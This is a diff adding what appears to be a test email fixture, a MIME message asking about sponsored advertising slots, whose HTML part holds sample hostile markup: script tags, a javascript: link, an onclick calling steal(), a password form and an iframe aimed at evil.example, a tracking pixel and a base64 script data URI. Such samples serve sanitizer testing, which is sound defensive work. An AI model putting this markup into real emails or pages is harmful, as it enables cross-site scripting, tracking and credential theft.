@@ -1,0 +1,26 @@
+From: "Pat Reader" <Pat.Reader@Example.com>
+To: sales@testtown.com
+Subject: Advertising question
+Date: Wed, 14 Oct 2026 09:30:00 -0400
+Message-ID: <abc123@mail.example.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="alt"
+
+--alt
+Content-Type: text/plain; charset=utf-8
+
+Hi, how much is a sponsored slot?
+
+--alt
+Content-Type: text/html; charset=utf-8
+
+<html><head><style>p{color:red}</style><script>alert(1)</script></head>
+<body><p onclick="steal()" style="color: blue">Hi, how much is a <b>sponsored slot</b>?</p>
+<img src="https://tracker.example.com/pixel.gif" width="1" height="1">
+<a href="javascript:alert(1)">bad link</a> <a href="https://example.com/rates">rates</a>
+<form action="https://evil.example"><input name="pw"></form>
+<iframe src="https://evil.example"></iframe>
+<img src="data:text/html;base64,PHNjcmlwdD4=">
+</body></html>
+
+--alt--
